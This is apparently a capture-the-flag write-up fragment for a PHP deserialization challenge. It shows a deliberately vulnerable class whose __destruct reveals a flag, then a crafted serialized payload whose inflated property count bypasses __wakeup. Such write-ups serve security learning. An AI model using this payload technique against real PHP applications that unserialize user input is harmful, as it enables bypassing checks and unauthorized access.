
```php
<?php
header("Content-type:text/html;charset=utf-8");
error_reporting(0);
show_source("class.php");
class HaHaHa{
        public $admin;
        public $passwd;

        public function __construct(){
            $this->admin ="user";
            $this->passwd = "123456";
        }

        public function __wakeup(){
            $this->passwd = sha1($this->passwd);
        }

        public function __destruct(){
            if($this->admin === "admin" && $this->passwd === "wllm"){
                include("flag.php");
                echo $flag;
            }else{
                echo $this->passwd;
                echo "No wake up";
            }
        }
    }
$Letmeseesee = $_GET['p'];

$aa = new HaHaHa();
$aa->admin = "admin";
$aa->passwd = "wllm";
$stus = serialize($aa);
print_r($stus);
?>
```


得到

O:6:"HaHaHa":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}

修改得到

O:6:"HaHaHa":3:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}